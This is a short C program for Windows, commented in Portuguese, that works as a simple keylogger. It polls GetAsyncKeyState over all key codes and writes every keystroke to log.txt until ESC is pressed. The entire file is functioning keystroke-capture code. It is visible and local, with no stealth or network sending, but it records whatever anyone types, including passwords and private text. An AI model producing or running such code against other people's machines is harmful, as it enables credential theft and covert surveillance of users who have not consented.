#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int main() {
    FILE *logfile;
    int key;

    // Abre o arquivo de log para escrita
    logfile = fopen("log.txt", "w");

    if (logfile == NULL) {
        printf("Erro ao abrir o arquivo de log.");
        return 1;
    }

    printf("Pressione ESC para sair.\n");

    // Loop infinito para capturar as teclas digitadas
    while (1) {
        if (GetAsyncKeyState(VK_ESCAPE)) { // Verifica se a tecla ESC foi pressionada
            break;
        }

        // Verifica cada tecla individual usando a função GetAsyncKeyState()
        for (key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 1) { // Verifica se a tecla está pressionada
                fputc(key, logfile); // Grava a tecla no arquivo de log
                fflush(logfile); // Limpa o buffer para garantir a escrita imediata
            }
        }
    }

    fclose(logfile); // Fecha o arquivo de log
    printf("Log salvo com sucesso em log.txt.\n");

    return 0;
}
